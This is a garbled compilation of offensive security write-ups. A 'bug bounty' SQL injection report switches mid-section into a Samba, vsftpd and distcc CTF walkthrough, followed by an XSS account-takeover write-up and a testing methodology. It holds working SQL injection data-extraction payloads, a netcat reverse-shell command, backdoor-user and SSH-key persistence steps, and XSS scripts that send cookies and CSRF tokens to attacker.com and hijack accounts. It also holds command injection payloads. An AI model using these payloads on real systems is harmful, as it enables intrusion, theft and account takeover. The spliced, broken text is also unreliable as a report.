    '# Critical SQL Injection Leading to Complete Database Compromise

## Executive Summary
During a bug bounty assessment on a major e-commerce platform, I discovered a critical SQL injection vulnerability that allowed complete database access, including customer data, payment information, and administrative credentials.

**Bounty Reward:** $5,000
**Severity:** Critical (CVSS 9.8)
**Impact:** Complete database compromise

## Discovery Process

### Initial Reconnaissance
The target was a large e-commerce platform with millions of users. I started with basic reconnaissance:

```bash
# Subdomain enumeration
subfinder -d target.com | httpx -silent

# Technology stack identification
whatweb target.com
wappalyzer target.com
```

### Vulnerability Discovery
While testing the product search functionality, I noticed the application was reflecting user input directly in SQL queries.

**Vulnerable Endpoint:** `https://target.com/search?q=[PAYLOAD]`

### Proof of Concept

#### 1. Error-based SQL Injection
```sql
# Initial test payload
search?q=test'' OR 1=1--

# Error message revealed MySQL database
search?q=test'' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### 2. Union-based Injection
```sql
# Determine number of columns
search?q=test'' UNION SELECT 1,2,3,4,5,6,7,8--

# Extract database information
search?q=test'' UNION SELECT 1,database(),user(),version(),5,6,7,8--
```

#### 3. Data Extraction
```sql
# Extract table names
search?q=test'' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema=database()--

# Extract user data
search?q=test'' UNION SELECT 1,GROUP_CONCAT(username,0x3a,email,0x3a,password),3,4,5,6,7,8 FROM users--
```

## Impact Assessment

### 3. Distcc Daemon
- **CVE:** CVE-2004-2687
- **Description:** Remote command execution
- **Exploitability:** High

## Exploitation

### Method 1: Samba 3.0.20 Exploitation (Recommended)

#### Using Metasploit
```bash
# Start Metasploit
msfconsole

# Search for Samba exploits
search samba 3.0.20

# Use the usermap_script exploit
use exploit/multi/samba/usermap_script

# Set target
set RHOSTS 10.10.10.3

# Check options
show options

# Execute exploit
exploit
```

#### Manual Exploitation
```bash
# Connect to SMB with malicious username
smbclient //10.10.10.3/tmp -U ""/=`nohup nc -e /bin/sh 10.10.14.1 4444`""
```

### Method 2: vsftpd 2.3.4 Backdoor

#### Using Metasploit
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.3
exploit
```

#### Manual Exploitation
```bash
# Trigger backdoor
telnet 10.10.10.3 21
USER test:)
PASS test

# Connect to backdoor shell
telnet 10.10.10.3 6200
```

### Method 3: Distcc Exploitation

#### Using Metasploit
```bash
use exploit/unix/misc/distcc_exec
set RHOSTS 10.10.10.3
set PAYLOAD cmd/unix/bind_netcat
exploit
```

## Post-Exploitation

### Initial Access
After successful exploitation via Samba, we get a root shell:

```bash
# Check current user
whoami
# Output: root

# Check system information
uname -a
cat /etc/issue
```

### Flag Collection

#### User Flag
```bash
# Navigate to user directory
cd /home
ls -la

# Find user flag
find /home -name "user.txt" 2>/dev/null
cat /home/makis/user.txt
```

#### Root Flag
```bash
# Navigate to root directory
cd /root

# Get root flag
cat root.txt
```

### System Information Gathering
```bash
# Check running processes
ps aux

# Check network connections
netstat -tulpn

# Check installed packages
dpkg -l

# Check cron jobs
crontab -l
cat /etc/crontab
```

## Privilege Escalation (Not Required)
Since we already have root access through the Samba exploit, privilege escalation is not necessary. However, for learning purposes:

### Potential Escalation Vectors
1. **Kernel exploits:** Check kernel version for known exploits
2. **SUID binaries:** Find SUID files that might be exploitable
3. **Sudo misconfigurations:** Check sudo permissions
4. **Cron jobs:** Look for writable cron scripts

```bash
# Check kernel version
uname -r

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l
```

## Persistence (Educational Purpose Only)

### SSH Key Installation
```bash
# Generate SSH key pair (on attacker machine)
ssh-keygen -t rsa -b 4096

# Add public key to authorized_keys
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### Backdoor User Creation
```bash
# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd

# Add to sudo group
usermod -aG sudo backdoor
```

## Mitigation and Remediation

### Immediate Actions
1. **Update Samba:** Upgrade to latest version
2. **Update vsftpd:** Remove or update FTP service
3. **Disable distcc:** Remove unnecessary services
4. **Patch system:** Apply all security updates

### Long-term Security Measures
1. **Regular updates:** Implement automated patching

    '# XSS to Account Takeover: A Complete Attack Chain

## Introduction
Cross-Site Scripting (XSS) vulnerabilities are often underestimated, but when properly exploited, they can lead to complete account takeover. This writeup demonstrates a real-world attack chain that escalated from a simple reflected XSS to full account compromise.

**Target:** Social Media Platform
**Bounty:** $3,500
**Impact:** Account takeover of any user

## Discovery Phase

### Initial Reconnaissance
The target was a popular social media platform with millions of users. I focused on user-generated content areas where XSS vulnerabilities commonly occur.

### Vulnerability Discovery
While testing the profile update functionality, I discovered that the "bio" field was vulnerable to reflected XSS.

**Vulnerable Parameter:** Profile bio field
**Endpoint:** `https://target.com/profile/update`

## Exploitation Development

### Step 1: Basic XSS Confirmation
```javascript
// Basic payload to confirm XSS
<script>alert(''XSS'')</script>

// Payload that bypassed initial filters
<img src=x onerror=alert(''XSS'')>
```

### Step 2: Filter Bypass
The application had several XSS filters in place:

```javascript
// Bypassing keyword filters
<svg onload=alert(''XSS'')>

// Bypassing script tag filters
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

// Final working payload
<svg/onload=eval(atob(''YWxlcnQoJ1hTUycpOw==''))>
```

### Step 3: Session Hijacking
```javascript
// Cookie stealing payload
<script>
var xhr = new XMLHttpRequest();
xhr.open(''POST'', ''https://attacker.com/steal'', true);
xhr.setRequestHeader(''Content-Type'', ''application/x-www-form-urlencoded'');
xhr.send(''cookies='' + encodeURIComponent(document.cookie));
</script>
```

### Step 4: CSRF Token Extraction
```javascript
// Extract CSRF token for authenticated requests
<script>
fetch(''/profile/settings'')
  .then(response => response.text())
  .then(html => {
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, ''text/html'');
    var csrfToken = doc.querySelector(''input[name="csrf_token"]'').value;
    
    // Send token to attacker server
    fetch(''https://attacker.com/csrf'', {
      method: ''POST'',
      body: ''token='' + csrfToken
    });
  });
</script>
```

### Step 5: Account Takeover Payload
```javascript
// Complete account takeover payload
<script>
(function() {
  // Step 1: Get CSRF token
  fetch(''/profile/settings'')
    .then(response => response.text())
    .then(html => {
      var parser = new DOMParser();
      var doc = parser.parseFromString(html, ''text/html'');
      var csrfToken = doc.querySelector(''input[name="csrf_token"]'').value;
      
      // Step 2: Change email
      var formData = new FormData();
      formData.append(''email'', ''attacker@evil.com'');
      formData.append(''csrf_token'', csrfToken);
      
      fetch(''/profile/update-email'', {
        method: ''POST'',
        body: formData
      }).then(() => {
        // Step 3: Change password
        var passData = new FormData();
        passData.append(''new_password'', ''hacked123'');
        passData.append(''csrf_token'', csrfToken);
        
        fetch(''/profile/change-password'', {
          method: ''POST'',
          body: passData
        });
      });
    });
})();
</script>
```

## Attack Execution

### Phase 1: Payload Delivery
1. **Social Engineering:** Crafted a convincing message to target users
2. **Payload Injection:** Embedded the XSS payload in profile bio
3. **Link Distribution:** Shared profile link through direct messages

### Phase 2: Victim Interaction
When victims visited the malicious profile:
1. XSS payload executed in their browser context
2. CSRF token extracted from authenticated session
3. Email and password changed automatically
4. Account credentials sent to attacker server

### Phase 3: Account Access
1. Received new credentials on attacker server
2. Logged into compromised accounts
3. Verified complete account takeover

## Technical Analysis

### Root Cause
The vulnerability existed due to:
1. **Insufficient input sanitization** in profile bio field
2. **Lack of Content Security Policy (CSP)**
3. **Predictable CSRF token location**
4. **No additional verification for sensitive operations**

### Attack Vector Breakdown
```
User Input → Insufficient Sanitization → XSS Execution → 
Session Context → CSRF Token Extraction → 
Authenticated Requests → Account Takeover
```

## Impact Assessment

### Immediate Impact
- **Complete account takeover** of any user who viewed the malicious profile
- **Data access** to private messages, photos, and personal information
- **Reputation damage** through unauthorized posts
- **Financial impact** for business accounts

### Potential Scale
- **Wormable attack:** Could spread automatically through social connections
- **Mass compromise:** Potential to affect thousands of users
- **Data breach:** Access to sensitive personal information

## Proof of Concept

### Demonstration Video
Created a controlled PoC demonstrating:
1. XSS payload injection
2. Victim account compromise
3. Attacker gaining full access

### Evidence Collection
- Screenshots of successful exploitation
- Network traffic captures
- Server logs showing unauthorized access
- Video demonstration of attack chain

## Remediation

### Immediate Fixes
1. **Input sanitization:** Implement proper HTML encoding
2. **Content Security Policy:** Deploy strict CSP headers
3. **CSRF protection:** Implement unpredictable token placement
4. **Email verification:** Require email confirmation for changes

### Long-term Security Measures
```javascript
// Secure input handling
function sanitizeInput(input) {
  return input
    .replace(/&/g, ''&amp;'')
    .replace(/</g, ''&lt;'')
    .replace(/>/g, ''&gt;'')
    .replace(/"/g, ''&quot;'')
    .replace(/''/g, ''&#x27;'');
}

// CSP Header
Content-Security-Policy: default-src ''self''; script-src ''self'' ''unsafe-inline''; object-src ''none'';
```

## Testing Methodology

### 1. Information Gathering
Information gathering is the foundation of any security assessment.

#### Passive Reconnaissance
- **DNS enumeration:** Discover subdomains and infrastructure
- **Search engine dorking:** Find exposed information
- **Social media intelligence:** Gather organizational information
- **Public records:** Company filings and technical documentation

```bash
# Subdomain enumeration
subfinder -d target.com | httpx -silent
amass enum -d target.com

# DNS reconnaissance
dig target.com ANY
nslookup target.com

# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin
```

#### Active Reconnaissance
- **Port scanning:** Identify open services
- **Service enumeration:** Determine versions and configurations
- **Technology stack identification:** Frameworks, databases, servers
- **Directory enumeration:** Discover hidden endpoints

```bash
# Port scanning
nmap -sC -sV -oA target target.com

# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ

# Technology identification
whatweb target.com
wappalyzer target.com
```

### 2. Authentication Testing
Authentication mechanisms are critical security controls that require thorough testing.

#### Username Enumeration
```bash
# Test for username enumeration
curl -X POST https://target.com/login -d "username=admin&password=wrong"
curl -X POST https://target.com/login -d "username=nonexistent&password=wrong"
```

#### Password Policy Testing
- Minimum length requirements
- Character complexity rules
- Password history enforcement
- Account lockout mechanisms

#### Session Management
```javascript
// Test session token entropy
function analyzeSessionToken(token) {
  console.log("Token length:", token.length);
  console.log("Character set:", [...new Set(token)].join(""));
  console.log("Entropy estimate:", calculateEntropy(token));
}
```

### 3. Authorization Testing
Test for proper access controls and privilege escalation vulnerabilities.

#### Horizontal Privilege Escalation
```bash
# Test accessing other users'' data
curl -H "Authorization: Bearer USER1_TOKEN" https://target.com/api/users/USER2_ID
```

#### Vertical Privilege Escalation
```bash
# Test admin functionality with regular user token
curl -H "Authorization: Bearer REGULAR_USER_TOKEN" https://target.com/admin/users
```

        time.sleep(1)  # Rate limiting
```

## OWASP Top 10 Testing

### A01: Broken Access Control
Access control vulnerabilities are the most common security issue.

#### Testing Checklist
- [ ] Test for IDOR (Insecure Direct Object References)
- [ ] Verify proper role-based access controls
- [ ] Test for privilege escalation
- [ ] Check for missing authorization on sensitive functions

```bash
# IDOR testing
curl https://target.com/api/users/1 -H "Authorization: Bearer TOKEN"
curl https://target.com/api/users/2 -H "Authorization: Bearer TOKEN"
```

### A02: Cryptographic Failures
Test for weak encryption and exposed sensitive data.

#### Testing Areas
- SSL/TLS configuration
- Password storage mechanisms
- Sensitive data transmission
- Cryptographic algorithm strength

```bash
# SSL testing
sslscan target.com
testssl.sh target.com

# Check for weak ciphers
nmap --script ssl-enum-ciphers -p 443 target.com
```

### A03: Injection
Test for various injection vulnerabilities.

#### SQL Injection
```sql
-- Time-based blind SQL injection
'' OR (SELECT SLEEP(5))--
'' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Union-based SQL injection
'' UNION SELECT 1,2,3,database(),5--
'' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--
```

#### NoSQL Injection
```javascript
// MongoDB injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

#### Command Injection
```bash
# Command injection payloads
; ls -la
| whoami
& ping -c 4 attacker.com
`id`
$(whoami)
```

### A04: Insecure Design
Review application architecture and design flaws.

#### Design Review Areas
